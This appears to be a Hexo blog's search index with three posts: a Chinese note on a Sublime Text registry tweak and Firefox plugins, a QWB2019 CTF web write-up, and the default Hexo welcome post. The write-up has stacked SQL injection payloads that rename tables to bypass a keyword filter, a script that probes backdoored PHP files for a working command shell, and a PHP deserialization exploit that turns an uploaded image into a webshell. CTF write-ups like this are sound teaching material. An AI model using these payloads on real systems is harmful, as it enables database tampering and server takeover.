<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>装环境中遇到的坑</title>
      <link href="/2020/05/01/%E8%A3%85%E7%8E%AF%E5%A2%83%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/"/>
      <url>/2020/05/01/%E8%A3%85%E7%8E%AF%E5%A2%83%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h1 id="装环境"><a href="#装环境" class="headerlink" title="装环境"></a>装环境</h1><h2 id="Sublime-Text-3"><a href="#Sublime-Text-3" class="headerlink" title="Sublime Text 3"></a>Sublime Text 3</h2><p>安装之后右键没有快捷打开方式，网上查找教程后修改注册表，过程如下：</p><p>1.win+R打开cmd窗口，输入regedit,打开注册表</p><p>2.找到HKEY_CLASSESS_ROOT-&gt;*-&gt;Shell，下面新建项，命名为Edit with Sublime Text3</p><p>3.在“Edit with Sublime Text”下新建字符串值，命名为Icon，值为 D:\Program Files\Sublime Text 3\sublime_text.exe,0</p><p>4.在项“Edit with Sublime Text”下新建项Command，Command项下默认值修改为 D:\Program Files\Sublime Text 3\sublime_text.exe\sublime_text.exe %1</p><p>结果虽然出现快捷键，但无法打开文件内容</p><p>经过多番尝试=-=，Command项下默认值需修改为 “D:\Program Files\Sublime Text 3\sublime_text.exe\sublime_text.exe” “%1”</p><p><img src="image-20200501214726125.png" alt="image-20200501214726125"></p><h2 id="firefox插件"><a href="#firefox插件" class="headerlink" title="firefox插件"></a>firefox插件</h2><p>1.hackbar</p><p>2.Proxy SwitchyOmega</p><p>3.LastPass: Free Password Manager</p><p>4.User-Agent Switcher</p><p>5.HTTP Header Live</p><p>6.Evernote Web Clipper</p><p>7.Infinity 新标签页 (Pro)</p><p>8.Ghostery</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>QWB2019-WEB-WP</title>
      <link href="/2017/03/23/QWB2019-WEB-WP/"/>
      <url>/2017/03/23/QWB2019-WEB-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><blockquote><p>如题名描述，是一道注入题。<br>Fuzz一下，发现</p><ul><li>1.WAF<br>return preg_match(“/select|update|delete|drop|insert|where|./i”, $inject);</li><li>2.通过报错注入出来的数据库名（supersqli）、用户等信息（果然是随便注）</li></ul></blockquote><blockquote><p>猜测后台SQL语句应该为：<br>select * from supersqli.table_name where id=’’ ;</p></blockquote><blockquote><p>由于过滤了select关键词，无法自定义进行数据查询操作。<br>经过进一步的测试后发现可以堆叠注入，通过’;show tables from supersqli;#等payload可以得知flag存在于1919810931114514表的flag字段中。</p></blockquote><blockquote><p>这里还是由于select被过滤不能自定义查询内容，结合后台SQL语句，得出思路：将1919810931114514表改名为words，这样在后台SQL语句不变的情况下仍然可以查询得到flag的内容。</p></blockquote><blockquote><p>最终payload如下：</p><pre><code class="mysql">&#39;;ALTER TABLE `1919810931114514` ADD `id` INT(1) NOT NULL DEFAULT &#39;1&#39; AFTER `flag`;%23</code></pre><p>（由于1919810931114514表中并没有id列，因此先添加id列）</p><pre><code class="mysql">&#39;;alter+table+`1919810931114514`+rename+to+`xxx`;alter+table+`words`+rename+to+`zzz`;alter+table+`xxx`+rename+to+`words`;%23</code></pre><p>最后直接查询就可以得到原1919810931114514表中的内容。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/6934571-f144d83797a04d4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><blockquote><p>赛后学习一波<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485809&idx=1&sn=5bde7da3fb89627829e037d2df960e7b&chksm=e89e21a9dfe9a8bf6cde9b14462193f5865a8ad78d75e77fb567717447a837cc189e42d41e27&mpshare=1&scene=1&srcid=05296ovJe1icseWeNedSPv3U&from=groupmessage&ascene=1&devicetype=android-28&version=2700043b&nettype=ctnet&abtest_cookie=BQABAAgACgALABIAEwAHAJ2GHgAjlx4AVpkeAM%2BZHgDcmR4A85keAAOaHgAAAA%3D%3D&lang=zh_CN&pass_ticket=l2CBPd8S9ZSwWXiBrOmoQ%2BclBwI22yXQErXXW5VGi04PAIUleF0OG51jkZMsZdJ6&wx_header=1" target="_blank" rel="noopener">ChaMd5师傅的操作</a></p></blockquote><pre><code>1&#39;;create procedure vk()begin  Set @v_sql=concat(&#39;sel&#39;,&#39;ect * from `1919810931114514`;&#39;);  Prepare stmt from @v_sql;  EXECUTE stmt;  deallocate Prepare stmt;end;call vk();-- -</code></pre><h2 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h2><blockquote><p>下载<a href="http://www.tar.gz后发现是3000多个“木马”文件。" target="_blank" rel="noopener">www.tar.gz后发现是3000多个“木马”文件。</a><br>简单审计一下发现虽然有很多命令执行的地方，但在此之前都已经将GET或POST参数赋空值，或者加上恒为假的if判断，于是乎写了个脚本提取每个文件中的GET、POST参数，在本地测试是否能够命令执行，最终在测试GET参数的过程中发现其中一个能用的shell并且获得其参数。</p></blockquote><pre><code>import requestsimport reimport osfrom time import sleepflies = os.listdir(&#39;./src&#39;)for i in flies:    url = &#39;http://127.0.0.1/src/&#39;+i    f = open(&#39;./src/&#39;+i)    data = f.read()    f.close()    reg = re.compile(r&#39;(?&lt;=_GET\[\&#39;).*(?=\&#39;\])&#39;)    params = reg.findall(data)    for j in params:        payload = url + &#39;/?&#39; + j + &#39;=echo 123456123456123456123456&#39;        print payload        req=requests.get(payload)        if &#39;123456123456123456123456&#39; in req.content:            print payload            exit();</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/6934571-c127144a8243b768.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><img src="https://upload-images.jianshu.io/upload_images/6934571-a24a9ea0150985e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><blockquote><p>下载备份文件<a href="http://www.tar.gz进行源码审计" target="_blank" rel="noopener">www.tar.gz进行源码审计</a><br>漏洞点在Profile类中的upload_img()函数中：</p></blockquote><pre><code>    public function upload_img(){        if($this-&gt;checker){            if(!$this-&gt;checker-&gt;login_check()){                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;                $this-&gt;redirect($curr_url,302);                exit();            }        }        if(!empty($_FILES)){            $this-&gt;filename_tmp=$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $this-&gt;filename=md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;            $this-&gt;ext_check();        }        if($this-&gt;ext) {            if(getimagesize($this-&gt;filename_tmp)) {                @copy($this-&gt;filename_tmp, $this-&gt;filename);                @unlink($this-&gt;filename_tmp);                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;                $this-&gt;update_img();            }else{                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;../index&#39;));            }        }else{            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;../index&#39;));        }    }</code></pre><p>通过<code>copy($this-&gt;filename_tmp, $this-&gt;filename);</code>就可以任意更改文件名了。<br>exp如下：</p><pre><code>class Register{    public $checker;    public $registed;}class Profile {    public $checker;    public $filename_tmp;    public $filename;    public $upload_menu;    public $ext;    public $img;    public $except;}$check = new Register();$check-&gt;registed=0;$check-&gt;checker = new Profile();$check-&gt;checker-&gt;except=array(&#39;index&#39;=&gt;&#39;upload_img&#39;);$check-&gt;checker-&gt;ext=1;$check-&gt;checker-&gt;filename_tmp=&quot;./upload/98acc62aa02eda032d1caed497ce72a0/0412c29576c708cf0155e8de242169b1.png&quot;;$check-&gt;checker-&gt;filename=&quot;./upload/98acc62aa02eda032d1caed497ce72a0/0412c29576c708cf0155e8de242169b1.php&quot;;echo base64_encode(serialize($cheeck));</code></pre>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QWB </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo</title>
      <link href="/2017/03/23/hexo/"/>
      <url>/2017/03/23/hexo/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
